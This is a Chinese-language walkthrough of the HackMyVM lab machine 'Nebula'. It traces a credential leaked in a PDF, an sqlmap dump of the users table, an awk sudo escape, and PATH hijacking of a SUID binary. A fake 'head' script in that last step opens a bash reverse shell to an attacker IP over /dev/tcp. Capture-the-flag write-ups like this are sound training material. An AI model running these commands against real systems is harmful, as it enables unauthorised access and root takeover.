# Nebula

2025.03.24 https://hackmyvm.eu/machines/machine.php?vm=Nebula

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

有登陆窗口，但是没有 sql 注入，在目录爆破中发现http://192.168.5.40/joinus/application_form.pdf 里面有一段标记了绿色的登陆凭据：

```
user=admin&password=d46df8e6a5627debf930f7b5c8f3b083
```

http://192.168.5.40/login/index.php 使用此凭据登陆成功。

搜索页面存在 sql 注入: http://192.168.5.40/login/search_central.php 直接 sqlmap：

```
nebuladb库中存在3个表: central 、centrals 、 users
sqlmap -r req.txt --batch -D nebuladb -T users --dump
```

发现 pmccentral:999999999 可登陆 ssh。

sudo -l 显示 awk，可切换到另外一个用户 laboratoryadmin:

```
sudo -u laboratoryadmin awk 'BEGIN {system("/bin/bash")}'
```

先拿到 user flag:

```
laboratoryadmin@laboratoryuser:~$ cat user.txt
flag{$udOeR$_Pr!V11E9E_I5_7En53}
```

发现 suid 程序：

```
laboratoryadmin@laboratoryuser:~/autoScripts$ ls -al
-rwxrwxr-x 1 laboratoryadmin laboratoryadmin     8 Dec 18  2023 head
-rwsr-xr-x 1 root            root            16792 Dec 17  2023 PMCEmployees
```

strings 查看字符串发现 PMCEmployees 内部调用了: head /home/pmccentral/documents/employees.txt , 直接修改 head 脚本的内容,并进行 PATH 变量劫持：

```
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' > head
export PATH=/home/laboratoryadmin/autoScripts:$PATH
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
```

拿到 root flag:

```
root@laboratoryuser:/root# cat root.txt
flag{r00t_t3ns0}
```
